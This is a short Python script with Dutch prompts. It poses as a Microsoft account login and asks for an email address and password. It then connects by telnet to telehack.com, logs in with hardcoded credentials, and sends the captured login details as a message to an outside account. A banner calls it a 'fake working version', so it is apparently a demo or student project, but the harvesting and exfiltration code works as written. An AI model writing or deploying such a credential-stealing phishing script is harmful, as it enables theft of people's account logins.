import telnetlib
import time

print("Graag inloggen bij je Microsoft account (DIT IS EEN VALS WERKENDE VERSIE DOOR CLEMENT V !!!)")
username = input("E-maiadres: ")
password = input("Wachtwoord: ")

host = "telehack.com"
port = 23

tn = telnetlib.Telnet(host, port, timeout=10)
print("EVEN GEDULD AUB")
time.sleep(1)
print(".")
tn.write(b"login\r\n")

time.sleep(1)
print(".")
tn.write(b"cyberhub\r\n")

time.sleep(1)
print(".")
tn.write(b"cyberhub123!\r\n")

time.sleep(1)
tn.write(b"send\r\n")

time.sleep(1)
print(".")
tn.write(b"cyberhub\r\n")

time.sleep(1)
print(".")
tn.write(("Het ingevoerde emailadres --> " + username + " en het wachtwoord --> " + password + "\r\n").encode("utf-8"))

time.sleep(1)
print("INGEDIEND ! PROGRAMMA WORDT AUTOMATISCH AFGESLOTEN !")
time.sleep(1)
print(tn.read_very_eager().decode("utf-8"))
tn.close()
